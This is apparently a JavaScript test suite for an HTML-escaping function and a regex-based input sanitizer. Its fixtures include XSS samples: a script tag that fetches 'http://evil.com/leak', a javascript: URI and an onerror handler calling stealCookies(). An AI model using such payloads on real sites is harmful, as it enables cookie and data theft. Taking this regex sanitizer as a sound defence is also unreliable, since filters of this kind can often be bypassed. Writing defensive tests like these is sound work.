import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

// Test HTML Escaping & Sanitization
function escapeHtml(input) {
  if (!input || typeof input !== 'string') return '';
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
  return input.replace(/[&<>"'/]/g, (m) => map[m] || m);
}

function sanitizeInput(input) {
  if (!input || typeof input !== 'string') return '';
  let clean = input.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
  clean = clean.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  clean = clean.replace(/on\w+\s*=\s*(["'])?[^"'>]+?\1/gi, '');
  clean = clean.replace(/(?:javascript|vbscript|data\s*:\s*text\/html):/gi, 'blocked:');
  clean = clean.replace(/<\/?(?:iframe|object|embed|applet)\b[^>]*>/gi, '');
  return clean.trim();
}

describe('Defensive Security Sanitizer Suite', () => {
  test('escapeHtml encodes dangerous HTML characters', () => {
    const raw = '<script>alert("xss")</script>';
    const escaped = escapeHtml(raw);
    assert.strictEqual(escaped.includes('<script>'), false);
    assert.strictEqual(escaped.includes('&lt;script&gt;'), true);
  });

  test('sanitizeInput strips inline <script> tags completely', () => {
    const malicious = 'Hello <script>fetch("http://evil.com/leak")</script> World';
    const clean = sanitizeInput(malicious);
    assert.strictEqual(clean, 'Hello  World');
  });

  test('sanitizeInput neutralizes dangerous javascript: URIs', () => {
    const uri = '<a href="javascript:alert(1)">Click</a>';
    const clean = sanitizeInput(uri);
    assert.strictEqual(clean.includes('javascript:'), false);
    assert.strictEqual(clean.includes('blocked:'), true);
  });

  test('sanitizeInput strips DOM event handlers', () => {
    const event = '<img src="x" onerror="stealCookies()" />';
    const clean = sanitizeInput(event);
    assert.strictEqual(clean.includes('onerror'), false);
  });
});
